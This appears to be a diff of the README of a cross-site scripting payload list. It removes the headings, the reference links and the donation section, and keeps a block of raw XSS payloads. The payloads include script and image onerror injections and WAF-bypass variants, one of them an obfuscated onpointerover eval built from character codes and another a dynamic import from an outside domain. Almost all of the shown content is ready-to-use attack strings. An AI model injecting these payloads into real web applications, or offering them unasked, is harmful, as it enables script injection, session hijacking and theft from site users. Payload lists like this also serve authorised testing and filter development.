@@ -1,8 +1,3 @@
-### 🚀 Cross Site Scripting ( XSS ) Vulnerability Payload List 🚀
-
-#### XSS Waf Bypass Payload List :
-
-```html
 '"><script>alert('karem')</script> 
 '"><img src=1 onerror="alert('Karem')">
 '"><img src=1 onkarem=1 onerror="alert('Karem')"> 
@@ -119,69 +114,3 @@ aaaaa<h1 onclick=alert(1)>test
 <textarea/onbeforeinput=kuro=&[#x27](tg://search_hashtag?hashtag=x27);//domain.tld&[#x27](tg://search_hashtag?hashtag=x27);;import(kuro)%09autofocus%09x>
 <div onpointerover="ja&#x76;ascr&#x69;pt:eva&#x6C;(decodeURICompo&#110;ent(String.fromCharCode(97, 108, 101, 114, 116, 40, 100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110, 41)))" style="width:100%;height:100vh;"></div>
 Payload before obfuscation: <div onpointerover="javascript:alert([document.domain](http://document.domain/?trk=public_post-text))" style="width:100%;height:100vh;"></div>
-
-```
-
-#### References :
-
-###### Cross-site Scripting (XSS)
-
-* 👉 https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
-
-###### XSS (Cross Site Scripting) Prevention Cheat Sheet
-
-* 👉 https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet
-
-###### DOM based XSS Prevention Cheat Sheet
-
-* 👉 https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet
-
-###### Testing for Reflected Cross site scripting (OTG-INPVAL-001)
-
-* 👉 https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001)
-
-###### Testing for Stored Cross site scripting (OTG-INPVAL-002)
-
-* 👉 https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002)
-
-###### Testing for DOM-based Cross site scripting (OTG-CLIENT-001)
-
-* 👉 https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001)
-
-###### DOM Based XSS
-
-* 👉 https://www.owasp.org/index.php/DOM_Based_XSS
-
-###### Cross-Site Scripting (XSS) Cheat Sheet | Veracode
-
-* 👉 https://www.veracode.com/security/xss
-
-#### Recommended books :
-
-* [XSS Attacks: Cross-site Scripting Exploits and Defense](https://books.google.com.tr/books/about/XSS_Attacks.html?id=dPhqDe0WHZ8C)
-
-* [XSS Cheat Sheet](https://leanpub.com/xss)
-
-
-### Cloning an Existing Repository ( Clone with HTTPS )
-```
-root@ismailtasdelen:~# git clone https://github.com/ismailtasdelen/xss-payload-list.git
-```
-
-### Cloning an Existing Repository ( Clone with SSH )
-```
-root@ismailtasdelen:~# git clone git@github.com:ismailtasdelen/xss-payload-list.git
-```
-
-### Published Website :
-
-##### Kitploit - https://www.kitploit.com/2018/05/xss-payload-list-cross-site-scripting.html
-
-### Donate!
-
-Support the authors:
-
-#### LiberaPay:
-
-<noscript><a href="https://liberapay.com/ismailtasdelen/donate"><img alt="Donate using Liberapay" src="https://liberapay.com/assets/widgets/donate.svg"></a></noscript>
---end--
